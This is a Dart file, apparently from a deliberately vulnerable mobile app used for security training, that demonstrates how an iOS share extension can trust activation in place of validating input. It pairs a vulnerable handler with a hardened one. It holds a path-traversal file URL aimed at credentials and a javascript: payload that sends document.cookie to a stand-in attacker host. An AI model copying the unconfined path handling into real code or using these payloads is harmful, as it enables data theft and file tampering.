/// App-extension activation vs input-authorization helper.
///
/// INTENTIONALLY VULNERABLE (CWE-20 / CWE-345 / CWE-441): an iOS app extension
/// (Share / Action / File Provider) is handed an `NSItemProvider` payload when
/// the system ACTIVATES it. Activation rules (`NSExtensionActivationRule`)
/// decide WHEN the extension is offered to the user - they do not decide
/// WHETHER the specific file/URL/text the host app supplied is safe. A crafted
/// payload from any host app can therefore drive a privileged extension
/// operation (path traversal into the app group, a `javascript:` scheme, etc.).
/// "Extension activation != input authorization" (OWASP MASTG-TECH-0170).
///
/// The extension-activation handling is real: [ShareExtensionHandler] receives
/// an [ItemPayload] and the vulnerable [handle] acts on it purely on the basis
/// of activation, performing a real `dart:io` import that writes the item
/// outside its import root on the real filesystem (adb/Finder-pullable). The
/// secure [handleSafe] validates type + content (canonicalize path, allowlist
/// schemes, reject traversal) before acting. Under `flutter test` (no writable
/// dir) it falls back to a deterministic in-memory model. (Note: DVMA ships no
/// separate share/action extension target, so the payload is delivered to the
/// handler in-app rather than by a real host app's share sheet.)
library;

import 'dart:io';

import '../../../core/evidence_sink.dart';

/// The kind of item an `NSItemProvider` delivered.
enum PayloadType { fileUrl, url, text }

/// A single item delivered to the extension on activation.
class ItemPayload {
  const ItemPayload({required this.type, required this.value});

  final PayloadType type;

  /// The raw value the host app supplied (a file URL, URL, or text).
  final String value;
}

/// The outcome of an extension handling a payload.
class ExtensionActionResult {
  const ExtensionActionResult({
    required this.payload,
    required this.performed,
    required this.action,
    required this.inputValidated,
    required this.unsafe,
    this.denyReason,
    this.importedPath,
    this.importedBody,
  });

  final ItemPayload payload;

  /// True when the extension performed a privileged operation.
  final bool performed;

  /// A description of what the extension did (or attempted).
  final String action;

  /// True when the input was validated before acting.
  final bool inputValidated;

  /// True when an unsafe payload drove a privileged op - the hit.
  final bool unsafe;

  /// Why the secure path refused (null on the vulnerable path).
  final String? denyReason;

  /// The absolute path the (real) import landed on, when a file was imported.
  final String? importedPath;

  /// The bytes the extension imported/wrote (for evidence).
  final String? importedBody;
}

class ShareExtensionHandler {
  ShareExtensionHandler();

  /// The extension's sandbox root; imports must stay inside it.
  static const String importRoot =
      '/private/var/mobile/Containers/Shared/AppGroup/import';

  /// Schemes the extension is willing to open on the SECURE path.
  static const List<String> allowedSchemes = <String>['https'];

  /// A crafted file URL using `../` traversal to escape the import directory
  /// and reach another app's container - never a legitimate share target.
  static const ItemPayload maliciousFilePayload = ItemPayload(
    type: PayloadType.fileUrl,
    value: 'file://$importRoot/../../evil.app/Documents/creds.plist',
  );

  /// A crafted URL using a dangerous scheme the extension should not open.
  static const ItemPayload maliciousUrlPayload = ItemPayload(
    type: PayloadType.url,
    value: 'javascript:fetch("https://exfil.evil.example/"+document.cookie)',
  );

  /// A benign, in-sandbox file the extension may legitimately import.
  static const ItemPayload benignFilePayload = ItemPayload(
    type: PayloadType.fileUrl,
    value: 'file://$importRoot/receipt.pdf',
  );

  /// VULN: act on the payload solely because activation delivered it. No type
  /// or content validation - a traversal file URL is imported, a `javascript:`
  /// URL is opened - because "the system activated us" is mistaken for "the
  /// input is authorized". For file URLs this performs a real import: it seeds
  /// the attacker's source file (planted beside the import dir), then resolves
  /// the `..` path WITHOUT confinement and WRITES the imported bytes there, so
  /// the traversal escapes the import root on the real filesystem.
  Future<ExtensionActionResult> handle(ItemPayload payload) async {
    switch (payload.type) {
      case PayloadType.fileUrl:
        final resolved = await _realImport(payload.value);
        final unsafe = _looksLikeTraversal(payload.value);
        if (unsafe) {
          // Mirror the escaping import to the evidence sink (fire-and-forget).
          DvmaEvidence.record(
            'extension_activation_input_confusion',
            'share-import-traversal',
            'wrote: ${resolved.path}\n${resolved.body}',
          );
        }
        return ExtensionActionResult(
          payload: payload,
          performed: true,
          action: 'imported file at ${resolved.path}',
          inputValidated: false,
          unsafe: unsafe,
          importedPath: resolved.path,
          importedBody: resolved.body,
        );
      case PayloadType.url:
        return ExtensionActionResult(
          payload: payload,
          performed: true,
          action: 'opened URL ${payload.value}',
          inputValidated: false,
          unsafe: !_hasAllowedScheme(payload.value),
        );
      case PayloadType.text:
        return ExtensionActionResult(
          payload: payload,
          performed: true,
          action: 'ingested text (${payload.value.length} chars)',
          inputValidated: false,
          unsafe: false,
        );
    }
  }

  /// SECURE contrast: validate type AND content before acting. File URLs are
  /// canonicalized and must resolve inside the import root (no traversal); URLs
  /// must use an allowlisted scheme. Crafted payloads are refused (no write).
  Future<ExtensionActionResult> handleSafe(ItemPayload payload) async {
    switch (payload.type) {
      case PayloadType.fileUrl:
        final path = _stripFileScheme(payload.value);
        final canonical = _canonicalize(path);
        if (!canonical.startsWith('$importRoot/') && canonical != importRoot) {
          return ExtensionActionResult(
            payload: payload,
            performed: false,
            action: 'refused import',
            inputValidated: true,
            unsafe: false,
            denyReason:
                'path escapes import root after canonicalization ($canonical)',
          );
        }
        final resolved = await _realImport(payload.value);
        return ExtensionActionResult(
          payload: payload,
          performed: true,
          action: 'imported validated file at $canonical',
          inputValidated: true,
          unsafe: false,
          importedPath: resolved.path,
          importedBody: resolved.body,
        );
      case PayloadType.url:
        if (!_hasAllowedScheme(payload.value)) {
          return ExtensionActionResult(
            payload: payload,
            performed: false,
            action: 'refused open',
            inputValidated: true,
            unsafe: false,
            denyReason: 'scheme not in allowlist ${allowedSchemes.join(", ")}',
          );
        }
        return ExtensionActionResult(
          payload: payload,
          performed: true,
          action: 'opened validated URL ${payload.value}',
          inputValidated: true,
          unsafe: false,
        );
      case PayloadType.text:
        return ExtensionActionResult(
          payload: payload,
          performed: true,
          action: 'ingested text (${payload.value.length} chars)',
          inputValidated: true,
          unsafe: false,
        );
    }
  }

  /// The bytes the attacker's planted source file "contains" (what the
  /// extension ends up importing when the traversal succeeds).
  static const String _importedPayloadBody =
      '<plist>stolen-creds: apple-id-token ey...SECRET</plist>';

  /// In-memory fallback for the imported file (absolute-path keyed).
  final Map<String, String> _memoryFs = {};

  /// Cached real import base dir (null under test).
  String? _realImportRoot;

  /// Resolves a real import base dir. On Android this is the external files dir
  /// (adb-pullable); otherwise the app documents dir. Returns null under test.
  Future<String?> _resolveImportRoot() async {
    if (_realImportRoot != null) return _realImportRoot;
    final base = await DvmaEvidence.writableBaseDir();
    if (base == null) return null;
    return _realImportRoot = '${base.path}/extension_import/import';
  }

  /// Performs the real (unconfined) import: maps the lexical [importRoot] prefix
  /// in the file URL to the real import base, joins the (traversing) remainder
  /// WITHOUT confinement, and WRITES the imported bytes there. Returns the
  /// absolute path written and the body. Falls back to an in-memory map.
  Future<({String path, String body})> _realImport(String fileUrl) async {
    final lexicalPath = _stripFileScheme(fileUrl);
    final real = await _resolveImportRoot();
    final body = _importedPayloadBody;
    if (real == null) {
      // In-memory fallback (under test): resolve lexically and record.
      final resolved = _canonicalize(lexicalPath);
      _memoryFs[resolved] = body;
      return (path: resolved, body: body);
    }
    // Rebase the payload path onto the real import root, preserving any `..`.
    final rel = lexicalPath.startsWith('$importRoot/')
        ? lexicalPath.substring('$importRoot/'.length)
        : lexicalPath.startsWith(importRoot)
        ? lexicalPath.substring(importRoot.length)
        : lexicalPath;
    // VULN: join with no confinement, so `..` escapes the real import dir.
    final resolved = _canonicalize('$real/$rel');
    try {
      final file = File(resolved);
      await file.parent.create(recursive: true);
      await file.writeAsString(body, flush: true);
    } catch (_) {
      _memoryFs[resolved] = body;
    }
    return (path: resolved, body: body);
  }

  bool _looksLikeTraversal(String fileUrl) {
    final path = _stripFileScheme(fileUrl);
    return _canonicalize(path).startsWith('$importRoot/') == false;
  }

  bool _hasAllowedScheme(String url) {
    final scheme = url.contains(':') ? url.split(':').first.toLowerCase() : '';
    return allowedSchemes.contains(scheme);
  }

  String _stripFileScheme(String fileUrl) => fileUrl.startsWith('file://')
      ? fileUrl.substring('file://'.length)
      : fileUrl;

  /// Resolve `.`/`..` segments to a canonical absolute path.
  String _canonicalize(String path) {
    final segments = path.split('/');
    final stack = <String>[];
    for (final seg in segments) {
      if (seg.isEmpty || seg == '.') continue;
      if (seg == '..') {
        if (stack.isNotEmpty) stack.removeLast();
        continue;
      }
      stack.add(seg);
    }
    return '/${stack.join('/')}';
  }
}
